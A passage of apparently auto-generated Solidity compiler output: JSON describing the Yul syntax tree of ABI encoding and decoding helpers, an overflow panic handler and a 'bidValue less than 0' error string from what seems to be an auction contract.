lFunctionCall","src":"4150:19:10"}],"functionName":{"name":"abi_encode_t_bool_to_t_bool_fromStack","nativeSrc":"4103:37:10","nodeType":"YulIdentifier","src":"4103:37:10"},"nativeSrc":"4103:67:10","nodeType":"YulFunctionCall","src":"4103:67:10"},"nativeSrc":"4103:67:10","nodeType":"YulExpressionStatement","src":"4103:67:10"}]},"name":"abi_encode_tuple_t_uint256_t_address_t_uint256_t_uint256_t_uint256_t_bool__to_t_uint256_t_address_t_uint256_t_uint256_t_uint256_t_bool__fromStack_reversed","nativeSrc":"3414:763:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"3578:9:10","nodeType":"YulTypedName","src":"3578:9:10","type":""},{"name":"value5","nativeSrc":"3590:6:10","nodeType":"YulTypedName","src":"3590:6:10","type":""},{"name":"value4","nativeSrc":"3598:6:10","nodeType":"YulTypedName","src":"3598:6:10","type":""},{"name":"value3","nativeSrc":"3606:6:10","nodeType":"YulTypedName","src":"3606:6:10","type":""},{"name":"value2","nativeSrc":"3614:6:10","nodeType":"YulTypedName","src":"3614:6:10","type":""},{"name":"value1","nativeSrc":"3622:6:10","nodeType":"YulTypedName","src":"3622:6:10","type":""},{"name":"value0","nativeSrc":"3630:6:10","nodeType":"YulTypedName","src":"3630:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"3641:4:10","nodeType":"YulTypedName","src":"3641:4:10","type":""}],"src":"3414:763:10"},{"body":{"nativeSrc":"4266:391:10","nodeType":"YulBlock","src":"4266:391:10","statements":[{"body":{"nativeSrc":"4312:83:10","nodeType":"YulBlock","src":"4312:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"4314:77:10","nodeType":"YulIdentifier","src":"4314:77:10"},"nativeSrc":"4314:79:10","nodeType":"YulFunctionCall","src":"4314:79:10"},"nativeSrc":"4314:79:10","nodeType":"YulExpressionStatement","src":"4314:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"4287:7:10","nodeType":"YulIdentifier","src":"4287:7:10"},{"name":"headStart","nativeSrc":"4296:9:10","nodeType":"YulIdentifier","src":"4296:9:10"}],"functionName":{"name":"sub","nativeSrc":"4283:3:10","nodeType":"YulIdentifier","src":"4283:3:10"},"nativeSrc":"4283:23:10","nodeType":"YulFunctionCall","src":"4283:23:10"},{"kind":"number","nativeSrc":"4308:2:10","nodeType":"YulLiteral","src":"4308:2:10","type":"","value":"64"}],"functionName":{"name":"slt","nativeSrc":"4279:3:10","nodeType":"YulIdentifier","src":"4279:3:10"},"nativeSrc":"4279:32:10","nodeType":"YulFunctionCall","src":"4279:32:10"},"nativeSrc":"4276:119:10","nodeType":"YulIf","src":"4276:119:10"},{"nativeSrc":"4405:117:10","nodeType":"YulBlock","src":"4405:117:10","statements":[{"nativeSrc":"4420:15:10","nodeType":"YulVariableDeclaration","src":"4420:15:10","value":{"kind":"number","nativeSrc":"4434:1:10","nodeType":"YulLiteral","src":"4434:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"4424:6:10","nodeType":"YulTypedName","src":"4424:6:10","type":""}]},{"nativeSrc":"4449:63:10","nodeType":"YulAssignment","src":"4449:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"4484:9:10","nodeType":"YulIdentifier","src":"4484:9:10"},{"name":"offset","nativeSrc":"4495:6:10","nodeType":"YulIdentifier","src":"4495:6:10"}],"functionName":{"name":"add","nativeSrc":"4480:3:10","nodeType":"YulIdentifier","src":"4480:3:10"},"nativeSrc":"4480:22:10","nodeType":"YulFunctionCall","src":"4480:22:10"},{"name":"dataEnd","nativeSrc":"4504:7:10","nodeType":"YulIdentifier","src":"4504:7:10"}],"functionName":{"name":"abi_decode_t_uint256","nativeSrc":"4459:20:10","nodeType":"YulIdentifier","src":"4459:20:10"},"nativeSrc":"4459:53:10","nodeType":"YulFunctionCall","src":"4459:53:10"},"variableNames":[{"name":"value0","nativeSrc":"4449:6:10","nodeType":"YulIdentifier","src":"4449:6:10"}]}]},{"nativeSrc":"4532:118:10","nodeType":"YulBlock","src":"4532:118:10","statements":[{"nativeSrc":"4547:16:10","nodeType":"YulVariableDeclaration","src":"4547:16:10","value":{"kind":"number","nativeSrc":"4561:2:10","nodeType":"YulLiteral","src":"4561:2:10","type":"","value":"32"},"variables":[{"name":"offset","nativeSrc":"4551:6:10","nodeType":"YulTypedName","src":"4551:6:10","type":""}]},{"nativeSrc":"4577:63:10","nodeType":"YulAssignment","src":"4577:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"4612:9:10","nodeType":"YulIdentifier","src":"4612:9:10"},{"name":"offset","nativeSrc":"4623:6:10","nodeType":"YulIdentifier","src":"4623:6:10"}],"functionName":{"name":"add","nativeSrc":"4608:3:10","nodeType":"YulIdentifier","src":"4608:3:10"},"nativeSrc":"4608:22:10","nodeType":"YulFunctionCall","src":"4608:22:10"},{"name":"dataEnd","nativeSrc":"4632:7:10","nodeType":"YulIdentifier","src":"4632:7:10"}],"functionName":{"name":"abi_decode_t_uint256","nativeSrc":"4587:20:10","nodeType":"YulIdentifier","src":"4587:20:10"},"nativeSrc":"4587:53:10","nodeType":"YulFunctionCall","src":"4587:53:10"},"variableNames":[{"name":"value1","nativeSrc":"4577:6:10","nodeType":"YulIdentifier","src":"4577:6:10"}]}]}]},"name":"abi_decode_tuple_t_uint256t_uint256","nativeSrc":"4183:474:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"4228:9:10","nodeType":"YulTypedName","src":"4228:9:10","type":""},{"name":"dataEnd","nativeSrc":"4239:7:10","nodeType":"YulTypedName","src":"4239:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"4251:6:10","nodeType":"YulTypedName","src":"4251:6:10","type":""},{"name":"value1","nativeSrc":"4259:6:10","nodeType":"YulTypedName","src":"4259:6:10","type":""}],"src":"4183:474:10"},{"body":{"nativeSrc":"4761:124:10","nodeType":"YulBlock","src":"4761:124:10","statements":[{"nativeSrc":"4771:26:10","nodeType":"YulAssignment","src":"4771:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"4783:9:10","nodeType":"YulIdentifier","src":"4783:9:10"},{"kind":"number","nativeSrc":"4794:2:10","nodeType":"YulLiteral","src":"4794:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"4779:3:10","nodeType":"YulIdentifier","src":"4779:3:10"},"nativeSrc":"4779:18:10","nodeType":"YulFunctionCall","src":"4779:18:10"},"variableNames":[{"name":"tail","nativeSrc":"4771:4:10","nodeType":"YulIdentifier","src":"4771:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"4851:6:10","nodeType":"YulIdentifier","src":"4851:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"4864:9:10","nodeType":"YulIdentifier","src":"4864:9:10"},{"kind":"number","nativeSrc":"4875:1:10","nodeType":"YulLiteral","src":"4875:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"4860:3:10","nodeType":"YulIdentifier","src":"4860:3:10"},"nativeSrc":"4860:17:10","nodeType":"YulFunctionCall","src":"4860:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"4807:43:10","nodeType":"YulIdentifier","src":"4807:43:10"},"nativeSrc":"4807:71:10","nodeType":"YulFunctionCall","src":"4807:71:10"},"nativeSrc":"4807:71:10","nodeType":"YulExpressionStatement","src":"4807:71:10"}]},"name":"abi_encode_tuple_t_address__to_t_address__fromStack_reversed","nativeSrc":"4663:222:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"4733:9:10","nodeType":"YulTypedName","src":"4733:9:10","type":""},{"name":"value0","nativeSrc":"4745:6:10","nodeType":"YulTypedName","src":"4745:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"4756:4:10","nodeType":"YulTypedName","src":"4756:4:10","type":""}],"src":"4663:222:10"},{"body":{"nativeSrc":"5004:34:10","nodeType":"YulBlock","src":"5004:34:10","statements":[{"nativeSrc":"5014:18:10","nodeType":"YulAssignment","src":"5014:18:10","value":{"name":"pos","nativeSrc":"5029:3:10","nodeType":"YulIdentifier","src":"5029:3:10"},"variableNames":[{"name":"updated_pos","nativeSrc":"5014:11:10","nodeType":"YulIdentifier","src":"5014:11:10"}]}]},"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nativeSrc":"4891:147:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"4976:3:10","nodeType":"YulTypedName","src":"4976:3:10","type":""},{"name":"length","nativeSrc":"4981:6:10","nodeType":"YulTypedName","src":"4981:6:10","type":""}],"returnVariables":[{"name":"updated_pos","nativeSrc":"4992:11:10","nodeType":"YulTypedName","src":"4992:11:10","type":""}],"src":"4891:147:10"},{"body":{"nativeSrc":"5150:8:10","nodeType":"YulBlock","src":"5150:8:10","statements":[]},"name":"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","nativeSrc":"5044:114:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nativeSrc":"5142:6:10","nodeType":"YulTypedName","src":"5142:6:10","type":""}],"src":"5044:114:10"},{"body":{"nativeSrc":"5327:235:10","nodeType":"YulBlock","src":"5327:235:10","statements":[{"nativeSrc":"5337:90:10","nodeType":"YulAssignment","src":"5337:90:10","value":{"arguments":[{"name":"pos","nativeSrc":"5420:3:10","nodeType":"YulIdentifier","src":"5420:3:10"},{"kind":"number","nativeSrc":"5425:1:10","nodeType":"YulLiteral","src":"5425:1:10","type":"","value":"0"}],"functionName":{"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nativeSrc":"5344:75:10","nodeType":"YulIdentifier","src":"5344:75:10"},"nativeSrc":"5344:83:10","nodeType":"YulFunctionCall","src":"5344:83:10"},"variableNames":[{"name":"pos","nativeSrc":"5337:3:10","nodeType":"YulIdentifier","src":"5337:3:10"}]},{"expression":{"arguments":[{"name":"pos","nativeSrc":"5525:3:10","nodeType":"YulIdentifier","src":"5525:3:10"}],"functionName":{"name":"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","nativeSrc":"5436:88:10","nodeType":"YulIdentifier","src":"5436:88:10"},"nativeSrc":"5436:93:10","nodeType":"YulFunctionCall","src":"5436:93:10"},"nativeSrc":"5436:93:10","nodeType":"YulExpressionStatement","src":"5436:93:10"},{"nativeSrc":"5538:18:10","nodeType":"YulAssignment","src":"5538:18:10","value":{"arguments":[{"name":"pos","nativeSrc":"5549:3:10","nodeType":"YulIdentifier","src":"5549:3:10"},{"kind":"number","nativeSrc":"5554:1:10","nodeType":"YulLiteral","src":"5554:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"5545:3:10","nodeType":"YulIdentifier","src":"5545:3:10"},"nativeSrc":"5545:11:10","nodeType":"YulFunctionCall","src":"5545:11:10"},"variableNames":[{"name":"end","nativeSrc":"5538:3:10","nodeType":"YulIdentifier","src":"5538:3:10"}]}]},"name":"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nativeSrc":"5164:398:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"5315:3:10","nodeType":"YulTypedName","src":"5315:3:10","type":""}],"returnVariables":[{"name":"end","nativeSrc":"5323:3:10","nodeType":"YulTypedName","src":"5323:3:10","type":""}],"src":"5164:398:10"},{"body":{"nativeSrc":"5756:191:10","nodeType":"YulBlock","src":"5756:191:10","statements":[{"nativeSrc":"5767:154:10","nodeType":"YulAssignment","src":"5767:154:10","value":{"arguments":[{"name":"pos","nativeSrc":"5917:3:10","nodeType":"YulIdentifier","src":"5917:3:10"}],"functionName":{"name":"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nativeSrc":"5774:141:10","nodeType":"YulIdentifier","src":"5774:141:10"},"nativeSrc":"5774:147:10","nodeType":"YulFunctionCall","src":"5774:147:10"},"variableNames":[{"name":"pos","nativeSrc":"5767:3:10","nodeType":"YulIdentifier","src":"5767:3:10"}]},{"nativeSrc":"5931:10:10","nodeType":"YulAssignment","src":"5931:10:10","value":{"name":"pos","nativeSrc":"5938:3:10","nodeType":"YulIdentifier","src":"5938:3:10"},"variableNames":[{"name":"end","nativeSrc":"5931:3:10","nodeType":"YulIdentifier","src":"5931:3:10"}]}]},"name":"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed","nativeSrc":"5568:379:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"5743:3:10","nodeType":"YulTypedName","src":"5743:3:10","type":""}],"returnVariables":[{"name":"end","nativeSrc":"5752:3:10","nodeType":"YulTypedName","src":"5752:3:10","type":""}],"src":"5568:379:10"},{"body":{"nativeSrc":"6107:288:10","nodeType":"YulBlock","src":"6107:288:10","statements":[{"nativeSrc":"6117:26:10","nodeType":"YulAssignment","src":"6117:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"6129:9:10","nodeType":"YulIdentifier","src":"6129:9:10"},{"kind":"number","nativeSrc":"6140:2:10","nodeType":"YulLiteral","src":"6140:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"6125:3:10","nodeType":"YulIdentifier","src":"6125:3:10"},"nativeSrc":"6125:18:10","nodeType":"YulFunctionCall","src":"6125:18:10"},"variableNames":[{"name":"tail","nativeSrc":"6117:4:10","nodeType":"YulIdentifier","src":"6117:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"6197:6:10","nodeType":"YulIdentifier","src":"6197:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"6210:9:10","nodeType":"YulIdentifier","src":"6210:9:10"},{"kind":"number","nativeSrc":"6221:1:10","nodeType":"YulLiteral","src":"6221:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"6206:3:10","nodeType":"YulIdentifier","src":"6206:3:10"},"nativeSrc":"6206:17:10","nodeType":"YulFunctionCall","src":"6206:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"6153:43:10","nodeType":"YulIdentifier","src":"6153:43:10"},"nativeSrc":"6153:71:10","nodeType":"YulFunctionCall","src":"6153:71:10"},"nativeSrc":"6153:71:10","nodeType":"YulExpressionStatement","src":"6153:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"6278:6:10","nodeType":"YulIdentifier","src":"6278:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"6291:9:10","nodeType":"YulIdentifier","src":"6291:9:10"},{"kind":"number","nativeSrc":"6302:2:10","nodeType":"YulLiteral","src":"6302:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"6287:3:10","nodeType":"YulIdentifier","src":"6287:3:10"},"nativeSrc":"6287:18:10","nodeType":"YulFunctionCall","src":"6287:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"6234:43:10","nodeType":"YulIdentifier","src":"6234:43:10"},"nativeSrc":"6234:72:10","nodeType":"YulFunctionCall","src":"6234:72:10"},"nativeSrc":"6234:72:10","nodeType":"YulExpressionStatement","src":"6234:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"6360:6:10","nodeType":"YulIdentifier","src":"6360:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"6373:9:10","nodeType":"YulIdentifier","src":"6373:9:10"},{"kind":"number","nativeSrc":"6384:2:10","nodeType":"YulLiteral","src":"6384:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"6369:3:10","nodeType":"YulIdentifier","src":"6369:3:10"},"nativeSrc":"6369:18:10","nodeType":"YulFunctionCall","src":"6369:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"6316:43:10","nodeType":"YulIdentifier","src":"6316:43:10"},"nativeSrc":"6316:72:10","nodeType":"YulFunctionCall","src":"6316:72:10"},"nativeSrc":"6316:72:10","nodeType":"YulExpressionStatement","src":"6316:72:10"}]},"name":"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed","nativeSrc":"5953:442:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"6063:9:10","nodeType":"YulTypedName","src":"6063:9:10","type":""},{"name":"value2","nativeSrc":"6075:6:10","nodeType":"YulTypedName","src":"6075:6:10","type":""},{"name":"value1","nativeSrc":"6083:6:10","nodeType":"YulTypedName","src":"6083:6:10","type":""},{"name":"value0","nativeSrc":"6091:6:10","nodeType":"YulTypedName","src":"6091:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"6102:4:10","nodeType":"YulTypedName","src":"6102:4:10","type":""}],"src":"5953:442:10"},{"body":{"nativeSrc":"6429:152:10","nodeType":"YulBlock","src":"6429:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"6446:1:10","nodeType":"YulLiteral","src":"6446:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"6449:77:10","nodeType":"YulLiteral","src":"6449:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"6439:6:10","nodeType":"YulIdentifier","src":"6439:6:10"},"nativeSrc":"6439:88:10","nodeType":"YulFunctionCall","src":"6439:88:10"},"nativeSrc":"6439:88:10","nodeType":"YulExpressionStatement","src":"6439:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"6543:1:10","nodeType":"YulLiteral","src":"6543:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"6546:4:10","nodeType":"YulLiteral","src":"6546:4:10","type":"","value":"0x11"}],"functionName":{"name":"mstore","nativeSrc":"6536:6:10","nodeType":"YulIdentifier","src":"6536:6:10"},"nativeSrc":"6536:15:10","nodeType":"YulFunctionCall","src":"6536:15:10"},"nativeSrc":"6536:15:10","nodeType":"YulExpressionStatement","src":"6536:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"6567:1:10","nodeType":"YulLiteral","src":"6567:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"6570:4:10","nodeType":"YulLiteral","src":"6570:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"6560:6:10","nodeType":"YulIdentifier","src":"6560:6:10"},"nativeSrc":"6560:15:10","nodeType":"YulFunctionCall","src":"6560:15:10"},"nativeSrc":"6560:15:10","nodeType":"YulExpressionStatement","src":"6560:15:10"}]},"name":"panic_error_0x11","nativeSrc":"6401:180:10","nodeType":"YulFunctionDefinition","src":"6401:180:10"},{"body":{"nativeSrc":"6630:190:10","nodeType":"YulBlock","src":"6630:190:10","statements":[{"nativeSrc":"6640:33:10","nodeType":"YulAssignment","src":"6640:33:10","value":{"arguments":[{"name":"value","nativeSrc":"6667:5:10","nodeType":"YulIdentifier","src":"6667:5:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"6649:17:10","nodeType":"YulIdentifier","src":"6649:17:10"},"nativeSrc":"6649:24:10","nodeType":"YulFunctionCall","src":"6649:24:10"},"variableNames":[{"name":"value","nativeSrc":"6640:5:10","nodeType":"YulIdentifier","src":"6640:5:10"}]},{"body":{"nativeSrc":"6763:22:10","nodeType":"YulBlock","src":"6763:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"6765:16:10","nodeType":"YulIdentifier","src":"6765:16:10"},"nativeSrc":"6765:18:10","nodeType":"YulFunctionCall","src":"6765:18:10"},"nativeSrc":"6765:18:10","nodeType":"YulExpressionStatement","src":"6765:18:10"}]},"condition":{"arguments":[{"name":"value","nativeSrc":"6688:5:10","nodeType":"YulIdentifier","src":"6688:5:10"},{"kind":"number","nativeSrc":"6695:66:10","nodeType":"YulLiteral","src":"6695:66:10","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"eq","nativeSrc":"6685:2:10","nodeType":"YulIdentifier","src":"6685:2:10"},"nativeSrc":"6685:77:10","nodeType":"YulFunctionCall","src":"6685:77:10"},"nativeSrc":"6682:103:10","nodeType":"YulIf","src":"6682:103:10"},{"nativeSrc":"6794:20:10","nodeType":"YulAssignment","src":"6794:20:10","value":{"arguments":[{"name":"value","nativeSrc":"6805:5:10","nodeType":"YulIdentifier","src":"6805:5:10"},{"kind":"number","nativeSrc":"6812:1:10","nodeType":"YulLiteral","src":"6812:1:10","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"6801:3:10","nodeType":"YulIdentifier","src":"6801:3:10"},"nativeSrc":"6801:13:10","nodeType":"YulFunctionCall","src":"6801:13:10"},"variableNames":[{"name":"ret","nativeSrc":"6794:3:10","nodeType":"YulIdentifier","src":"6794:3:10"}]}]},"name":"increment_t_uint256","nativeSrc":"6587:233:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"6616:5:10","nodeType":"YulTypedName","src":"6616:5:10","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"6626:3:10","nodeType":"YulTypedName","src":"6626:3:10","type":""}],"src":"6587:233:10"},{"body":{"nativeSrc":"6922:73:10","nodeType":"YulBlock","src":"6922:73:10","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"6939:3:10","nodeType":"YulIdentifier","src":"6939:3:10"},{"name":"length","nativeSrc":"6944:6:10","nodeType":"YulIdentifier","src":"6944:6:10"}],"functionName":{"name":"mstore","nativeSrc":"6932:6:10","nodeType":"YulIdentifier","src":"6932:6:10"},"nativeSrc":"6932:19:10","nodeType":"YulFunctionCall","src":"6932:19:10"},"nativeSrc":"6932:19:10","nodeType":"YulExpressionStatement","src":"6932:19:10"},{"nativeSrc":"6960:29:10","nodeType":"YulAssignment","src":"6960:29:10","value":{"arguments":[{"name":"pos","nativeSrc":"6979:3:10","nodeType":"YulIdentifier","src":"6979:3:10"},{"kind":"number","nativeSrc":"6984:4:10","nodeType":"YulLiteral","src":"6984:4:10","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"6975:3:10","nodeType":"YulIdentifier","src":"6975:3:10"},"nativeSrc":"6975:14:10","nodeType":"YulFunctionCall","src":"6975:14:10"},"variableNames":[{"name":"updated_pos","nativeSrc":"6960:11:10","nodeType":"YulIdentifier","src":"6960:11:10"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"6826:169:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"6894:3:10","nodeType":"YulTypedName","src":"6894:3:10","type":""},{"name":"length","nativeSrc":"6899:6:10","nodeType":"YulTypedName","src":"6899:6:10","type":""}],"returnVariables":[{"name":"updated_pos","nativeSrc":"6910:11:10","nodeType":"YulTypedName","src":"6910:11:10","type":""}],"src":"6826:169:10"},{"body":{"nativeSrc":"7107:64:10","nodeType":"YulBlock","src":"7107:64:10","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nativeSrc":"7129:6:10","nodeType":"YulIdentifier","src":"7129:6:10"},{"kind":"number","nativeSrc":"7137:1:10","nodeType":"YulLiteral","src":"7137:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"7125:3:10","nodeType":"YulIdentifier","src":"7125:3:10"},"nativeSrc":"7125:14:10","nodeType":"YulFunctionCall","src":"7125:14:10"},{"hexValue":"62696456616c7565206c657373207468616e2030","kind":"string","nativeSrc":"7141:22:10","nodeType":"YulLiteral","src":"7141:22:10","type":"","value":"bidValue less than 0"}],"functionName":{"name":"mstore","nativeSrc":"7118:6:10","nodeType":"YulIdentifier","src":"7118:6:10"},"nativeSrc":"7118:46:10","nodeType":"YulFunctionCall","src":"7118:46:10"},"nativeSrc":"7118:46:10","nodeType":"YulExpressionStatement","src":"7118:46:10"}]},"name":"store_literal_in_memory_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a","nativeSrc":"7001:170:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nativeSrc":"7099:6:10","nodeType":"YulTypedName","src":"7099:6:10","type":""}],"src":"7001:170:10"},{"body":{"nativeSrc":"7323:220:10","nodeType":"YulBlock","src":"7323:220:10","statements":[{"nativeSrc":"7333:74:10","nodeType":"YulAssignment","src":"7333:74:10","value":{"arguments":[{"name":"pos","nativeSrc":"7399:3:10","nodeType":"YulIdentifier","src":"7399:3:10"},{"kind":"number","nativeSrc":"7404:2:10","nodeType":"YulLiteral","src":"7404:2:10","type":"","value":"20"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"7340:58:10","nodeType":"YulIdentifier","src":"7340:58:10"},"nativeSrc":"7340:67:10","nodeType":"YulFunctionCall","src":"7340:67:10"},"variableNames":[{"name":"pos","nativeSrc":"7333:3:10","nodeType":"YulIdentifier","src":"7333:3:10"}]},{"expression":{"arguments":[{"name":"pos","nativeSrc":"7505:3:10","nodeType":"YulIdentifier","src":"7505:3:10"}],"functionName":{"name":"store_literal_in_memory_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a","nativeSrc":"7416:88:10","nodeType":"YulIdentifier","src":"7416:88:10"},"nativeSrc":"7416:93:10","nodeType":"YulFunctionCall","src":"7416:93:10"},"nativeSrc":"7416:93:10","nodeType":"YulExpressionStatement","src":"7416:93:10"},{"nativeSrc":"7518:19:10","nodeType":"YulAssignment","src":"7518:19:10","value":{"arguments":[{"name":"pos","nativeSrc":"7529:3:10","nodeType":"YulIdentifier","src":"7529:3:10"},{"kind":"number","nativeSrc":"7534:2:10","nodeType":"YulLiteral","src":"7534:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"7525:3:10","nodeType":"YulIdentifier","src":"7525:3:10"},"nativeSrc":"7525:12:10","nodeType":"YulFunctionCall","src":"7525:12:10"},"variableNames":[{"name":"end","nativeSrc":"7518:3:10","nodeType":"YulIdentifier","src":"7518:3:10"}]}]},"name":"abi_encode_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a_to_t_string_memory_ptr_fromStack","nativeSrc":"7177:366:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"7311:3:10","nodeType":"YulTypedName","src":"7311:3:10","type":""}],"returnVariables":[{"name":"end","nativeSrc":"7319:3:10","nodeType":"YulTypedName","src":"7319:3:10","type":""}],"src":"7177:366:10"},{"body":{"nativeSrc":"7720:248:10","nodeType":"YulBlock","src":"7720:248:10","statements":[{"nativeSrc":"7730:26:10","nodeType":"YulAssignment","src":"7730:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"7742:9:10","nodeType":"YulIdentifier","src":"7742:9:10"},{"kind":"number","nativeSrc":"7753:2:10","nodeType":"YulLiteral","src":"7753:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"7738:3:10","nodeType":"YulIdentifier","src":"7738:3:10"},"nativeSrc":"7738:18:10","nodeType":"YulFunctionCall","src":"7738:18:10"},"variableNames":[{"name":"tail","nativeSrc":"7730:4:10","nodeType":"YulIdentifier","src":"7730:4:10"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"7777:9:10","nodeType":"YulIdentifier","src":"7777:9:10"},{"kind":"number","nativeSrc":"7788:1:10","nodeType":"YulLiteral","src":"7788:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"7773:3:10","nodeType":"YulIdentifier","src":"7773:3:10"},"nativeSrc":"7773:17:10","nodeType":"YulFunctionCall","src":"7773:17:10"},{"arguments":[{"name":"tail","nativeSrc":"7796:4:10","nodeType":"YulIdentifier","src":"7796:4:10"},{"name":"headStart","nativeSrc":"7802:9:10","nodeType":"YulIdentifier","src":"7802:9:10"}],"functionName":{"name":"sub","nativeSrc":"7792:3:10","nodeType":"YulIdentifier","src":"7792:3:10"},"nativeSrc":"7792:20:10","nodeType":"YulFunctionCall","src":"7792:20:10"}],"functionName":{"name":"mstore","nativeSrc":"7766:6:10","nodeType":"YulIdentifier","src":"7766:6:10"},"nativeSrc":"7766:47:10","nodeType":"YulFunctionCall","src":"7766:47:10"},"nativeSrc":"7766:47:10","nodeType":"YulExpressionStatement","src":"7766:47:10"},{"nativeSrc":"7822:139:10","nodeType":"YulAssignment","src":"7822:139:10","value":{"arguments":[{"name":"tail","nativeSrc":"7956:4:10","nodeType":"YulIdentifier","src":"7956:4:10"}],"functionName":{"name":"abi_encode_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a_to_t_string_memory_ptr_fromStack","nativeSrc":"7830:124:10","nodeType":"YulIdentifier","src":"7830:124:10"},"nativeSrc":"7830:131:10","nodeType":"YulFunctionCall","src":"7830:131:10"},"variableNames":[{"name":"tail","nativeSrc":"7822:4:10","nodeType":"YulIdentifier","src":"7822:4:10"}]}]},"name":"abi_encode_tuple_t_stringliteral_71c3a965e4da9bf4528a6b0a2f1da81500b833e1f3c621d8ceef48fb5c7dba9a__to_t_string_memory_ptr__fromStack_reversed","nativeSrc":"7549:419:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"7700:9:10","nodeType":"YulTypedName"